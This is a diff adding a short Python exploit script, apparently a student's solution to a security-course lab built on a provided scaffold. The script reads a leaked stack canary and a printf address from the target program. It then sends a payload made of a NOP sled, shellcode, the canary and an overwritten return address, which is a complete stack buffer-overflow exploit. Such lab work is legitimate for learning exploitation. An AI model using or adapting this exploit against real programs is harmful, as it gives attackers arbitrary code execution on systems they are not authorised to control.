@@ -1,0 +1,43 @@
+#!/usr/bin/env python3
+
+import scaffold as p
+from scaffold import SHELLCODE
+import sys
+
+# Configure Python to print text strings like byte strings. Don't remove this!
+sys.stdout.reconfigure(encoding='latin1')
+
+### HELPER FUNCTIONS ###
+
+def int_to_bytes(x: int) -> str:
+    return x.to_bytes((x.bit_length() + 7) // 8, 'little').decode('latin1')
+
+### YOUR CODE STARTS HERE ###
+
+# Program start:
+p.start()
+
+# Example send:
+#p.send('test\n')
+
+# Example receive:
+#print(p.recv(150))
+p.recvline()
+cana = p.recvline()
+cana = int(cana[28:38],0)
+cana = int_to_bytes(cana)
+printf = p.recvline()
+printf = printf[33:43]
+printf = int(printf,0)
+ret = int_to_bytes(printf+41)
+
+nop = '\x90'
+
+poison = nop*(4*46)+SHELLCODE+cana+4*3*nop+ret+'\n'
+
+p.send(poison)
+
+
+#print(len(SHELLCODE))
+
+### YOUR CODE ENDS HERE ###
